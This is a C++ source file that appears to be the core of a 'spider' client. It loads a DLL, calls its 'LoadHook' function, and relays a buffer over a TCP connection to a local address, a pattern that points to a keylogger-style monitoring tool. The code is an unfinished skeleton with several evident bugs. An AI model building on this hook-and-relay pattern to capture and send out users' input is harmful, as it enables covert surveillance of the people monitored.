#include "stdafx.h"
#include "Core.h"
#include <winsock2.h>

Core::Core()
{
	this->_cli = Utils::newTCPClient();
	this->_shm = new SharedMemoryServer("spider-shm");
	this->_writer = new writer();
	this->_IP = "127.0.0.1";
	this->_PORT = 22;
	this->_mod = 0;
}


Core::~Core()
{

}

void	Core::reseauTCP(const std::string IP, int port)
{
	if (this->_mod == SEND)
		this->_cli->write(this->_buff);
	else if (this->_mod = READ)
		this->_cli->read(this->_buff, 2048);
}

void	Core::run()
{
	int	t;
	typedef void(*fnPtr)(void);

	this->_Dll = LoadLibrary(L"ClientDll.dll");
	if (this->_Dll == NULL) {
		printf("The DLL could not be found.n");
		getchar();
		return ;
	}
	fnPtr addr = (fnPtr)GetProcAddress(this->_Dll, "LoadHook");
	if (addr == NULL) {
		printf("The function was not found.n");
		getchar();
		return ;
	}
	addr();

	this->_cli->connect(this->_IP, this->_PORT);
	this->_thr.launch(reseauTCP);

	while (1)
	{

		this->_data.analyze(this->_buff);

		this->_data.doSmth();
		t = this->_data.getTask();
		this->_data.getmsg();
		this->_msg = this->_data.getStruct(); // ou le getstruct

		//this->_buffshm = this->_shm.read();

		std::cout << "Shm Inut : " << 1 << std::endl;
		Sleep(1000);
	}

}

void	Core::stop()
{
	this->_writer->clean_file();
}